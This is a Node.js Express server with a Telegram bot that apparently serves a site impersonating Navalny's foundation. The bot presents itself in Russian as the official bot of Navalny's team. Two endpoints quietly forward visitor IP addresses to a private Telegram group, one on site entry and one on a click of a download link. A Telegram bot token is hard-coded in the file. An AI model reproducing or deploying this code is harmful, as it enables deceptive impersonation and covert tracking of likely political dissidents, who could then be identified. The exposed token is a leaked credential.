const express = require('express');
const cors = require('cors');
const app = express();
const TelegramBot = require('node-telegram-bot-api');
const token = '6783727389:AAFQ7RbVFm-zGDmTqAWuUMA_GWQsuKBgIoY';
const bot = new TelegramBot(token, { polling: true });

var corsOptions = {
    // origin: "http://localhost:4200",
    origin: "http://www.navalnyfbk.com/",
};

app.use(cors(corsOptions));

// parse requests of content-type - application/json
app.use(express.json());

// parse requests of content-type - application/x-www-form-urlencoded
app.use(express.urlencoded({ extended: true }));

// simple route
app.get('/', (req, res) => {
    res.json({ message: "Welcome to server" });
});

app.post('/api/ip', (req, res) => {
    if (!req.body.ip) {
        res.status(400).send({ message: "Empty Ip!" });
        return;
    }

    bot.sendMessage(
        '-4111041487',
        `Вход на сайт👨🏼‍💻\nIP: ${req.body.ip}`
    );

    res.send(null);
});

app.post('/api/instructions', (req, res) => {
    if (!req.body.ip) {
        res.status(400).send({ message: "Empty Ip!" });
        return;
    }

    bot.sendMessage(
        '-4111041487',
        `Переход по ссылке для скачивания📁\nIP: ${req.body.ip}`
    );

    res.send(null);
});

// set port, listen for requests
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}.`);
});


bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const messageText = msg.text;
  
    console.info(chatId);
    console.info(messageText);

    if (messageText === '/start') {
        bot.sendMessage(chatId, 'Добро пожаловать в официальный бот команды Навального!');
    }
});
